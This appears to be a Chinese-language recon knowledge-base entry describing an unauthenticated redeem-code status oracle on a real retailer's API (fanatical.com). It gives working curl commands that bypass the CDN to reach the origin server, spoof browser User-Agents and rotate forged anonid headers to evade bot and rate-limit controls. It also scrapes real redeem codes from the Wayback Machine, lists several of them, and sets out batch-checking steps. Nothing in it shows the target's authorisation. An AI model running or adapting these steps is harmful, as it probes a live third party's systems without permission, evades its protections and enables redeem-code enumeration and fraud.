# 结论

`POST /api/redeem-code/search` 是**未鉴权的兑换码存在性 / 使用状态 oracle**：

- 真实存在且已使用 → `HTTP 400 / 30B`，body `{"message":"Redeem code used"}`
- 不存在 → `HTTP 400 / 33B`，body `{"message":"Invalid redeem code"}`

两者 **HTTP 状态码完全一样**，分叉只在响应体文案与长度。只判 status code 会直接漏报。

该结论修正了 KB 条目 #684 表内「/api/redeem-code/search 对任意输入统一 400 Invalid、无有效/过期/已使用分级」一行：
#684 测的是 key-preview 泄露的 **24 位 hex ObjectId**（`free_redeem_code` 字段），
不是兑换页真实使用的 **`RC` + 12 位字母数字码**，输入形态不同导致误判。
#684 的主结论（24hex 内部标识不能当兑换码用）仍然成立。

# 前置条件

- admin.fanatical.com 与 www.fanatical.com 是同一 Heroku/Express 应用，两条通路都可达：
  - 经 Cloudflare：`https://www.fanatical.com/api/redeem-code/search`
  - 源站直连：`--noproxy '*' --resolve admin.fanatical.com:443:<GA_IP>` + `Host: admin.fanatical.com`
- 零凭据、零 Cookie、零 Authorization。但请求必须带：
  - 浏览器类 `User-Agent`（裸 curl UA 会被边缘 403 `Request blocked`）
  - `anonid: <UUIDv4>`（任意合法 UUIDv4 即可；缺失会被应用层 400 拦下）
  - `Content-Type: application/json`

# 判定表

| 输入 | HTTP | body | 长度 | 判定 |
|---|---|---|---|---|
| 真实存在且已使用 `RC7dq2bSaTBuBk` | 400 | `{"message":"Redeem code used"}` | 30B | 码存在，状态=已使用 |
| 不存在 `RCZZZZZZZZZZZZ` | 400 | `{"message":"Invalid redeem code"}` | 33B | 码不存在（或不可用） |
| 真实码末位改 1 字符 `RC7dq2bSaTBuBX` | 400 | `{"message":"Invalid redeem code"}` | 33B | 精确匹配，非前缀/格式判断 |
| 真实码全小写 `rc7dq2bsatbubk` | 400 | `{"message":"Invalid redeem code"}` | 33B | 大小写敏感 |

**只确认了「存在且已用」与「不存在」两个分支**；「存在但未使用」的回显未验证，
不要假设它一定 200 或某个固定文案。遇到第三分支必须重新取证后再下结论。

# 复现步骤

## 1) 取真实码样本（公开归档，无需撞库）

Fanatical 的兑换页 URL 在 Wayback 里会带 `?redeemcode=`：

```bash
curl -s 'https://web.archive.org/cdx/search/cdx?url=www.fanatical.com/de/redeem-code&matchType=prefix&output=json' \
  | grep -oE 'redeemcode=RC[0-9A-Za-z]{12}' | sort -u
# 实测该 CDX 查询返回 182 行归档，其中 10 个为 2022-10~2022-12 的 RC+12 位真实码
```

这批码通常早已被使用，正好作为「存在且已用」分支样本（无剩余价值）。

实测样本（均为 Wayback 公开归档、状态=已使用，仅供校验形态）：
```
RC7dq2bSaTBuBk  RC9ahsU61DEX4v  RCfG9LiryhzW4h  RCiDKGURqZQcCh
RCiWkdu5pUDkVY  RCrHBNy2h1YZZu  RCw5fegxanBy7Z  RCy2FPpCEzWM3c
RCyr61G2zPMbW4
```
（原始记录中的第 10 个码值被文本替换污染，未收录；请用上面的 CDX 命令现取，不要依赖硬编码列表。）

## 2) 单发验证（源站直连）

```bash
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36}"
ANON=$(cat /proc/sys/kernel/random/uuid)
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45 \
  -A "$UA" -H 'Host: admin.fanatical.com' \
  -H "anonid: $ANON" \
  -H 'Content-Type: application/json' -X POST \
  -d '{"code":"RC7dq2bSaTBuBk"}' \
  -w '\n[%{http_code} %{size_download}B]\n' \
  https://admin.fanatical.com/api/redeem-code/search
# → 400 30B {"message":"Redeem code used"}
```

阴性对照：`-d '{"code":"RCZZZZZZZZZZZZ"}'` → 400 33B `{"message":"Invalid redeem code"}`。

GA IP 会变，现取：`nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1`。

## 3) 批量判定

对候选码串行请求，按 `size_download` + body 文案二分类：

- `30` / `Redeem code used` → 存在且已使用（命中）
- `33` / `Invalid redeem code` → 不存在
- 其他 → 存疑（第三状态 / 429 限速 / 边缘拦截），单独记录，不要混入统计

建议每请求换 `anonid`（UUIDv4 不过期、无状态），并保留 1~数秒间隔。

# 失败常见原因

1. **429 / 0B 空响应**：redeem-code 路由族有应用层令牌桶。KB #598 在同一路由族实测：
   伪造 `X-Forwarded-For` / `X-Real-IP` / `Forwarded` / `Client-IP` **不能换桶**，
   只能降速或等窗口（www 窗口可能 ≥10 分钟）。本条发现记录里「换 XFF 规避双桶」的说法
   与该实测冲突，以 #598 的同路由实测为准。
2. **400 / 15B text/html `Request blocked`**：缺 `anonid` 或值不是合法 UUIDv4。
3. **403 `Request blocked`**：裸 curl UA 被边缘爬虫规则拦，换浏览器 UA。
4. **404 或其它路由回显**：Host 头不对 / 打到 Cloudflare 而非源站；`--noproxy '*'` 必须加，
   否则本机代理会重解析 DNS，让 `--resolve` 失效。
5. **把 400 当「全部失败」**：两个分支 HTTP 码相同，必须读 body 长度与文案。

# 影响与用法

- **离线归档码在线核验**：判断 Wayback / 论坛 / 截图里出现的码现在是否真实存在、是否已被使用。
- **已知码定向判定**：按 `RC` + 12 位 base62 形态核验某个具体码是否存在/已绑定。
  空间为 62^12，盲猜不可行；价值在「验证已知候选」而非大规模爆破。
- **通用判据**：兑换码/礼品卡类接口若两分支 status 相同，必须比对 body 长度与文案，
  否则会把 oracle 误判成「无分叉」。

# 未验证边界

- 「存在但未使用」分支（是否 200 / 什么文案）未知。
- 码是否绑定订单/账号、是否受地区或时间限制：该接口不回显，仅能区分存在/已用状态。
- 限速窗口长度未精确测量（KB #598 给出 apistaging 约 2-3 分钟、www 更长的量级）。